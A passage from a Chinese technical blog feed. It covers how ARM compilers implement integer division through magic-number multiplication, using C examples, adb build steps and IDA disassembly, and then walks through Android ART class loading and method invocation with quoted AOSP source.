<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000003D4                 PUSH            &#123;R4-R6,R10,R11,LR&#125;</span><br><span class="line">.text:000003D8                 ADD             R11, SP, #0x10</span><br><span class="line">.text:000003DC                 LDR             R5, =(aD - 0x3FC) ; &quot;%d\r\n&quot;</span><br><span class="line">.text:000003E0                 MOV             R6, R0,ASR#31 ; 获取符号位，R6=0或者R6=-1</span><br><span class="line">.text:000003E4                 MOV             R4, R0</span><br><span class="line">.text:000003E8                 MOV             R1, #0</span><br><span class="line">.text:000003EC                 ADD             R0, R0, R6,LSR#30 ; R6逻辑右移30位，则R6=0或者R6=3</span><br><span class="line">.text:000003F0                 SUB             R1, R1, R0,ASR#2 ; 0-(R0&gt;&gt;2)</span><br><span class="line">.text:000003F4                 ADD             R5, PC, R5 ; &quot;%d\r\n&quot;</span><br><span class="line">.text:000003F8                 MOV             R0, R5  ; format</span><br><span class="line">.text:000003FC                 BL              printf</span><br><span class="line">.text:00000400                 ADD             R0, R4, R6,LSR#29 ; R6逻辑右移29位，则R6=0或者R6=7</span><br><span class="line">.text:00000404                 BIC             R0, R0, #7</span><br><span class="line">.text:00000408                 SUB             R1, R4, R0</span><br><span class="line">.text:0000040C                 MOV             R0, R5  ; format</span><br><span class="line">.text:00000410                 BL              printf</span><br><span class="line">.text:00000414                 MOV             R0, #0</span><br><span class="line">.text:00000418                 POP             &#123;R4-R6,R10,R11,LR&#125;</span><br><span class="line">.text:0000041C                 BX              LR</span><br></pre></td></tr></table></figure>

<h2 id="x-除以非-2-n"><a href="#x-除以非-2-n" class="headerlink" title="x 除以非 2^n"></a>x 除以非 2^n</h2><h3 id="第一种情况，MAGIC-NUM-gt-0"><a href="#第一种情况，MAGIC-NUM-gt-0" class="headerlink" title="第一种情况，MAGIC_NUM &gt; 0"></a>第一种情况，MAGIC_NUM &gt; 0</h3><p>算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(x &gt;=0)</span><br><span class="line">    (x * MAGIC_NUM) &gt;&gt; (32 + n);</span><br><span class="line">else</span><br><span class="line">    ((x * MAGIC_NUM) &gt;&gt; (32 + n)) + 1;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>除数 o &#x3D; 2^(32+n) &#x2F; MAGIC_NUM;</p>
</blockquote>
<p>例如:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = argc / <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    n = argc % <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>makefile文件：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">div03:</span></span><br><span class="line">	clang -target arm-linux-android21 -O2 div03.c -o div03</span><br><span class="line">	adb push div03 /data/local/tmp/div03</span><br><span class="line">	adb shell chmod +x /data/local/tmp/div03</span><br><span class="line">	adb shell /data/local/tmp/div03</span><br></pre></td></tr></table></figure>

<p>IDA 反汇编结果如下：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>B7A693D4                 <span class="keyword">PUSH</span>            &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span>B7A693D8                 <span class="keyword">ADD</span>             <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span></span><br><span class="line"><span class="symbol">.text:</span>B7A693DC                 <span class="keyword">LDR</span>             <span class="built_in">R5</span>, =(aD - <span class="number">0xB7A693F4</span>) <span class="comment">; &quot;%d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>B7A693E0                 <span class="keyword">MOV</span>             <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span>B7A693E4                 <span class="keyword">LDR</span>             <span class="built_in">R0</span>, <span class="number">=0x55555556</span></span><br><span class="line"><span class="symbol">.text:</span>B7A693E8                 <span class="keyword">SMULL</span>           <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R4</span>, <span class="built_in">R0</span> <span class="comment">; R1,R2=x*MAGIC_NUM</span></span><br><span class="line"><span class="symbol">.text:</span>B7A693EC                 <span class="keyword">ADD</span>             <span class="built_in">R5</span>, <span class="built_in">PC</span>, <span class="built_in">R5</span> <span class="comment">; &quot;%d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>B7A693F0                 <span class="keyword">ADD</span>             <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R2</span>,LSR<span class="number">#31</span> <span class="comment">; 逻辑右移31位获取符号位，即+0或+1；R1,R2组成的64位数隐式的右移动了32位</span></span><br><span class="line"><span class="symbol">.text:</span>B7A693F4                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R5</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span>B7A693F8                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span>B7A693FC                 <span class="keyword">LDR</span>             <span class="built_in">R0</span>, <span class="number">=0x66666667</span></span><br><span class="line"><span class="symbol">.text:</span>B7A69400                 <span class="keyword">SMULL</span>           <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span>B7A69404                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R2</span>,ASR<span class="number">#1</span> <span class="comment">; R2算术右移1位，实际相当于R1,R2组成的64位数移动了32+1位</span></span><br><span class="line"><span class="symbol">.text:</span>B7A69408                 <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">R0</span>, <span class="built_in">R2</span>,LSR<span class="number">#31</span> <span class="comment">; 逻辑右移31位获取符号位</span></span><br><span class="line"><span class="symbol">.text:</span>B7A6940C                 <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">R0</span>, <span class="built_in">R0</span>,LSL<span class="number">#2</span></span><br><span class="line"><span class="symbol">.text:</span>B7A69410                 <span class="keyword">SUB</span>             <span class="built_in">R1</span>, <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span>B7A69414                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R5</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span>B7A69418                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span>B7A6941C                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span>B7A69420                 <span class="keyword">POP</span>             &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span>B7A69424                 <span class="keyword">BX</span>              <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>

<h3 id="第二种情况，MAGIC-NUM-lt-0"><a href="#第二种情况，MAGIC-NUM-lt-0" class="headerlink" title="第二种情况，MAGIC_NUM &lt; 0"></a>第二种情况，MAGIC_NUM &lt; 0</h3><p>算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (x &gt;=0) </span><br><span class="line">    ((x * MAGIC_NUM) &gt;&gt; 32 + x) &gt;&gt; n</span><br><span class="line">if (x &lt; 0) </span><br><span class="line">    (((x * MAGIC_NUM) &gt;&gt; 32 + x) &gt;&gt; n) + 1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>除数o &#x3D; 2^(32+n) &#x2F; MAGIC_NUM;</p>
</blockquote>
<p>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    int n = argc / 7;</span><br><span class="line">    printf(&quot;%d\r\n&quot;, n);</span><br><span class="line">    n = argc % 13;</span><br><span class="line">    printf(&quot;%d\r\n&quot;, n);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>makefile文件：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">div03:</span></span><br><span class="line">	clang -target arm-linux-android21 -O2 div03.c -o div03</span><br><span class="line">	adb push div03 /data/local/tmp/div03</span><br><span class="line">	adb shell chmod +x /data/local/tmp/div03</span><br><span class="line">	adb shell /data/local/tmp/div03</span><br></pre></td></tr></table></figure>

<p>IDA 反汇编结果如下：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D4</span>                 <span class="keyword">PUSH</span>            &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D8</span>                 <span class="keyword">ADD</span>             <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>DC                 <span class="keyword">MOV</span>             <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E0                 <span class="keyword">LDR</span>             <span class="built_in">R0</span>, <span class="number">=0x92492493</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E4                 <span class="keyword">LDR</span>             <span class="built_in">R5</span>, =(aD - <span class="number">0x3F4</span>) <span class="comment">; &quot;%d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E8                 <span class="keyword">SMULL</span>           <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>EC                 <span class="keyword">ADD</span>             <span class="built_in">R5</span>, <span class="built_in">PC</span>, <span class="built_in">R5</span> <span class="comment">; &quot;%d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F0</span>                 <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">R2</span>, <span class="built_in">R4</span> <span class="comment">; 等价(x * MAGIC_NUM) &gt;&gt; 32 + x</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F4</span>                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R0</span>,ASR<span class="number">#2</span> <span class="comment">; 然后继续右移n位</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>F8                 <span class="keyword">ADD</span>             <span class="built_in">R1</span>, <span class="built_in">R1</span>, <span class="built_in">R0</span>,LSR<span class="number">#31</span> <span class="comment">; 获取符号位</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>FC                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R5</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000400</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000404</span>                 <span class="keyword">LDR</span>             <span class="built_in">R0</span>, <span class="number">=0x4EC4EC4F</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000408</span>                 <span class="keyword">SMULL</span>           <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000040</span>C                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R2</span>,ASR<span class="number">#2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000410</span>                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="number">#0xD</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000414</span>                 <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">R0</span>, <span class="built_in">R2</span>,LSR<span class="number">#31</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000418</span>                 <span class="keyword">MUL</span>             <span class="built_in">R2</span>, <span class="built_in">R0</span>, <span class="built_in">R1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000041</span>C                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R5</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000420</span>                 <span class="keyword">SUB</span>             <span class="built_in">R1</span>, <span class="built_in">R4</span>, <span class="built_in">R2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000424</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000428</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000042</span>C                 <span class="keyword">POP</span>             &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000430</span>                 <span class="keyword">BX</span>              <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>

<h2 id="x-除以负非-2-n"><a href="#x-除以负非-2-n" class="headerlink" title="x 除以负非 2^n"></a>x 除以负非 2^n</h2><p>当 x 除以负数 c 时， MAGIC_NUM 为 x 除以 |c| 的 MAGIC_NUM 的补码</p>
<h3 id="第一种情况，-MAGIC-NUM-gt-0"><a href="#第一种情况，-MAGIC-NUM-gt-0" class="headerlink" title="第一种情况， MAGIC_NUM &gt; 0"></a>第一种情况， MAGIC_NUM &gt; 0</h3><p>算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(x &gt;=0)</span><br><span class="line">    ((x * MAGIC_NUM)&gt;&gt;32 - x)&gt;&gt;n;</span><br><span class="line">else</span><br><span class="line">    ((x * MAGIC_NUM)&gt;&gt;32 - x)&gt;&gt;n + 1;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>除数o &#x3D; - 2^(32 + n) &#x2F;(2^32-MAGIC_NUM)</p>
</blockquote>
<p>例如: </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = argc / <span class="number">-3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    n = argc / <span class="number">-5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>makefile文件：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">div05:</span></span><br><span class="line">	clang -target arm-linux-android21 -O2 div05.c -o div05</span><br><span class="line">	adb push div05 /data/local/tmp/div05</span><br><span class="line">	adb shell chmod +x /data/local/tmp/div05</span><br><span class="line">	adb shell /data/local/tmp/div05</span><br></pre></td></tr></table></figure>

<p>IDA 反汇编结果如下：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="第二种情况，MAGIC-NUM-lt-0-1"><a href="#第二种情况，MAGIC-NUM-lt-0-1" class="headerlink" title="第二种情况，MAGIC_NUM &lt; 0"></a>第二种情况，MAGIC_NUM &lt; 0</h3><p>算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(x &gt;=0)</span><br><span class="line">    (x * MAGIC_NUM) &gt;&gt; (32 + n);</span><br><span class="line">else</span><br><span class="line">    ((x * MAGIC_NUM) &gt;&gt; (32 + n)) + 1;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>除数o &#x3D; -2^(32+n) &#x2F; (2^32-MAGIC_NUM)</p>
</blockquote>
<p>例如: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x / -7; </span><br><span class="line">MOV     R5, R0</span><br><span class="line">MOV     R6, R0,ASR#31</span><br><span class="line">LDR     R1, =2454267027</span><br><span class="line">SMULL   R3, R1, R5, R1</span><br><span class="line">ADD     R1, R1, R5</span><br><span class="line">RSB     R1, R6, R1,ASR#2</span><br><span class="line"></span><br><span class="line">o = -2^34 / 2454267027;</span><br></pre></td></tr></table></figure>

<h2 id="x-为无符号数，除以2-n"><a href="#x-为无符号数，除以2-n" class="headerlink" title="x 为无符号数，除以2^n"></a>x 为无符号数，除以2^n</h2><p>算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x &gt;&gt; n</span><br></pre></td></tr></table></figure>
<p>例如: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> x / 8</span><br><span class="line">MOV     R1, R0,LSR#3</span><br></pre></td></tr></table></figure>

<h2 id="x-为无符号数，除以非-2-n"><a href="#x-为无符号数，除以非-2-n" class="headerlink" title="x 为无符号数，除以非 2^n"></a>x 为无符号数，除以非 2^n</h2><h3 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h3><p>算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(x * MAGIC_NUM)&gt;&gt;(32+n)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>除数o &#x3D; 2^(32+n) &#x2F; MAGIC_NUM</p>
</blockquote>
<p>例如: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x / 3</span><br><span class="line"></span><br><span class="line">LDR     R1, =0xAAAAAAAB</span><br><span class="line">UMULL   R3, R1, R0, R1</span><br><span class="line">MOV     R1, R1,LSR#1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h3><p>算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(((x - (x*MAGIC_NUM) &gt;&gt; 32) &gt;&gt; i) + (x*MAGIC_NUM) &gt;&gt; 32) &gt;&gt; j</span><br></pre></td></tr></table></figure>
<blockquote>
<p>除数o &#x3D; (2^(32 + i +j)) &#x2F; (2^32 + MAGIC_NUM);</p>
</blockquote>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x / 7; </span><br><span class="line">LDR     R3, =0x24924925</span><br><span class="line">UMULL   R2, R3, R0, R3</span><br><span class="line">RSB     R1, R3, R0</span><br><span class="line">ADD     R1, R3, R1,LSR#1</span><br><span class="line">MOV     R1, R1,LSR#2</span><br></pre></td></tr></table></figure>
<p>除法运算主要就是以上几种模式，看到类似的 MAGIC_NUM 可以初步判断为除法。</p>
]]></content>
      <categories>
        <category>ARMv8汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>ART的函数运行机制</title>
    <url>/2020/06/03/ART%E7%9A%84%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h1><p><code>dalvik</code> 的类加载的主要过程如下：</p>
<ol>
<li><p><code>app_process</code> 作为 <code>zygote server</code> 通过 <code>local socket</code> 处理进程创建请求，<code>zygote server</code> 是在 <code>ZygoteInit.main</code> 函数里调用 <code>ZygoteInit.runSelectLoop</code> 监听。</p>
</li>
<li><p>接收到 <code>zygote client</code> 的 <code>fork</code> 请求之后，调用 <code>ZygoteConnection.runOnce</code> ，调用 <code>Zygote.forkAndSpecialize</code> 创建新进程</p>
</li>
<li><p>进程创建之后，由 <code>ZygoteConnection.handleParentProc</code> 来初始化进程，最终会调用 <code>ActivityThread.main</code> 函数</p>
</li>
<li><p><code>ActivityThread.main -&gt; ActivityThread.attach -&gt;  ActivityThread.bindApplication -&gt; Activity.handleBindApplication，handleBindApplication</code> 会初始化 <code>BaseDexClassLoader</code> 。</p>
</li>
<li><p>类的加载经过了 <code>ClassLoader.loadClass-&gt;BaseDexClassLoader.findClass-&gt;DexPathList.findClass-&gt;DexFile.loadClassBinaryName-&gt;DexFile.defineClassNative-&gt;DexFile_defineClassNative</code> (<code>runtime/native/dalvik_system_DexFile.cc</code>) 。</p>
</li>
</ol>
<p>这个初始化过程， <code>art</code> 和 <code>dalvik</code> 都是一样的。 <code>art</code> 的 <code>DexFile_defineClassNative</code> 由 <code>ClassLinker</code> 的 <code>DefineClass</code> 来加载类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static jclass DexFile_defineClassNative(JNIEnv* env,</span><br><span class="line">                                        jclass,</span><br><span class="line">                                        jstring javaName,</span><br><span class="line">                                        jobject javaLoader,</span><br><span class="line">                                        jobject cookie,</span><br><span class="line">                                        jobject dexFile) &#123;</span><br><span class="line">  std::vector&lt;const DexFile*&gt; dex_files;</span><br><span class="line">  const OatFile* oat_file;</span><br><span class="line">  if (!ConvertJavaArrayToDexFiles(env, cookie, /*out*/ dex_files, /*out*/ oat_file)) &#123;</span><br><span class="line">    VLOG(class_linker) &lt;&lt; &quot;Failed to find dex_file&quot;;</span><br><span class="line">    DCHECK(env-&gt;ExceptionCheck());</span><br><span class="line">    return nullptr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ScopedUtfChars class_name(env, javaName);</span><br><span class="line">  if (class_name.c_str() == nullptr) &#123;</span><br><span class="line">    VLOG(class_linker) &lt;&lt; &quot;Failed to find class_name&quot;;</span><br><span class="line">    return nullptr;</span><br><span class="line">  &#125;</span><br><span class="line">  const std::string descriptor(DotToDescriptor(class_name.c_str()));</span><br><span class="line">  const size_t hash(ComputeModifiedUtf8Hash(descriptor.c_str()));</span><br><span class="line">  for (auto&amp; dex_file : dex_files) &#123;</span><br><span class="line">    const DexFile::ClassDef* dex_class_def =</span><br><span class="line">        OatDexFile::FindClassDef(*dex_file, descriptor.c_str(), hash);</span><br><span class="line">    if (dex_class_def != nullptr) &#123;</span><br><span class="line">      ScopedObjectAccess soa(env);</span><br><span class="line">      ClassLinker* class_linker = Runtime::Current()-&gt;GetClassLinker();</span><br><span class="line">      StackHandleScope&lt;1&gt; hs(soa.Self());</span><br><span class="line">      Handle&lt;mirror::ClassLoader&gt; class_loader(</span><br><span class="line">          hs.NewHandle(soa.Decode&lt;mirror::ClassLoader&gt;(javaLoader)));</span><br><span class="line">      ObjPtr&lt;mirror::DexCache&gt; dex_cache =</span><br><span class="line">          class_linker-&gt;RegisterDexFile(*dex_file, class_loader.Get());</span><br><span class="line">      if (dex_cache == nullptr) &#123;</span><br><span class="line">        // OOME or InternalError (dexFile already registered with a different class loader).</span><br><span class="line">        soa.Self()-&gt;AssertPendingException();</span><br><span class="line">        return nullptr;</span><br><span class="line">      &#125;</span><br><span class="line">      ObjPtr&lt;mirror::Class&gt; result = class_linker-&gt;DefineClass(soa.Self(),</span><br><span class="line">                                                               descriptor.c_str(),</span><br><span class="line">                                                               hash,</span><br><span class="line">                                                               class_loader,</span><br><span class="line">                                                               *dex_file,</span><br><span class="line">                                                               *dex_class_def);</span><br><span class="line">      // Add the used dex file. This only required for the DexFile.loadClass API since normal</span><br><span class="line">      // class loaders already keep their dex files live.</span><br><span class="line">      class_linker-&gt;InsertDexFileInToClassLoader(soa.Decode&lt;mirror::Object&gt;(dexFile),</span><br><span class="line">                                                 class_loader.Get());</span><br><span class="line">      if (result != nullptr) &#123;</span><br><span class="line">        VLOG(class_linker) &lt;&lt; &quot;DexFile_defineClassNative returning &quot; &lt;&lt; result</span><br><span class="line">                           &lt;&lt; &quot; for &quot; &lt;&lt; class_name.c_str();</span><br><span class="line">        return soa.AddLocalReference&lt;jclass&gt;(result);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  VLOG(class_linker) &lt;&lt; &quot;Failed to find dex_class_def &quot; &lt;&lt; class_name.c_str();</span><br><span class="line">  return nullptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类的加载除了创建 <code>Class</code> 只外，还有加载类的字段和方法，这个由 <code>ClassLinker::LoadClass</code> 来完成。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void ClassLinker::LoadClass(Thread* self,</span><br><span class="line">                            const DexFile&amp; dex_file,</span><br><span class="line">                            const DexFile::ClassDef&amp; dex_class_def,</span><br><span class="line">                            Handle&lt;mirror::Class&gt; klass) &#123;</span><br><span class="line">  const uint8_t* class_data = dex_file.GetClassData(dex_class_def);</span><br><span class="line">  if (class_data == nullptr) &#123;</span><br><span class="line">    return;  // no fields or methods - for example a marker interface</span><br><span class="line">  &#125;</span><br><span class="line">  LoadClassMembers(self, dex_file, class_data, klass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="函数的执行"><a href="#函数的执行" class="headerlink" title="函数的执行"></a>函数的执行</h1><p>一旦类的加载完成，那么就可以调用类的成员函数了，之前的解释器运行机制那篇文章介绍过， <code>Java</code> 的执行是以 <code>Method</code> 为执行单元的，所以我们分析 <code>art</code> 的运行机制，其实就是分析 <code>Method</code> 的运行机制。</p>
<p><code>ActivityThread</code> 是进程在启动的时候传类名，在进程启动之后，由 <code>handleParentProc</code> 执行 <code>main</code> 函数，因此第一个被执行的 <code>java</code> 函数是 <code>ActivityThread.main</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Process.ProcessStartResult startResult = Process.start(&quot;android.app.ActivityThread&quot;,  </span><br><span class="line">                    app.processName, uid, uid, gids, debugFlags, mountExternal,  </span><br><span class="line">                    app.info.targetSdkVersion, app.info.seinfo, null);</span><br></pre></td></tr></table></figure>

<p><code>ActivityThread.main</code> 是最终由 <code>AndroidRuntime::callMain</code> 执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">status_t AndroidRuntime::callMain(const String8&amp; className, jclass clazz,</span><br><span class="line">    const Vector&lt;String8&gt;&amp; args)</span><br><span class="line">&#123;</span><br><span class="line">    JNIEnv* env;</span><br><span class="line">    jmethodID methodId;</span><br><span class="line"></span><br><span class="line">    ALOGD(&quot;Calling main entry %s&quot;, className.string());</span><br><span class="line"></span><br><span class="line">    env = getJNIEnv();</span><br><span class="line">    if (clazz == NULL || env == NULL) &#123;</span><br><span class="line">        return UNKNOWN_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    methodId = env-&gt;GetStaticMethodID(clazz, &quot;main&quot;, &quot;([Ljava/lang/String;)V&quot;);</span><br><span class="line">    if (methodId == NULL) &#123;</span><br><span class="line">        ALOGE(&quot;ERROR: could not find method %s.main(String[])\n&quot;, className.string());</span><br><span class="line">        return UNKNOWN_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * We want to call main() with a String array with our arguments in it.</span><br><span class="line">     * Create an array and populate it.</span><br><span class="line">     */</span><br><span class="line">    jclass stringClass;</span><br><span class="line">    jobjectArray strArray;</span><br><span class="line"></span><br><span class="line">    const size_t numArgs = args.size();</span><br><span class="line">    stringClass = env-&gt;FindClass(&quot;java/lang/String&quot;);</span><br><span class="line">    strArray = env-&gt;NewObjectArray(numArgs, stringClass, NULL);</span><br><span class="line"></span><br><span class="line">    for (size_t i = 0; i &lt; numArgs; i++) &#123;</span><br><span class="line">        jstring argStr = env-&gt;NewStringUTF(args[i].string());</span><br><span class="line">        env-&gt;SetObjectArrayElement(strArray, i, argStr);</span><br><span class="line">    &#125;</span><br><span class="line">    /*</span><br><span class="line">    关键函数</span><br><span class="line">    */</span><br><span class="line">    env-&gt;CallStaticVoidMethod(clazz, methodId, strArray);</span><br><span class="line">    return NO_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际会调用 <code>JNINativeInterface</code> 的 <code>CallStaticVoidMethod</code> ，上面已经介绍过，该函数的定义在 <code>runtime/jni_internal.cc</code> 里。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void CallStaticVoidMethod(JNIEnv* env, jclass, jmethodID mid, ...) &#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, mid);</span><br><span class="line">  ScopedVAArgs free_args_later(&amp;ap);</span><br><span class="line">  CHECK_NON_NULL_ARGUMENT_RETURN_VOID(mid);</span><br><span class="line">  ScopedObjectAccess soa(env);</span><br><span class="line">  /*</span><br><span class="line">  关键函数</span><br><span class="line">  */</span><br><span class="line">  InvokeWithVarArgs(soa, nullptr, mid, ap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

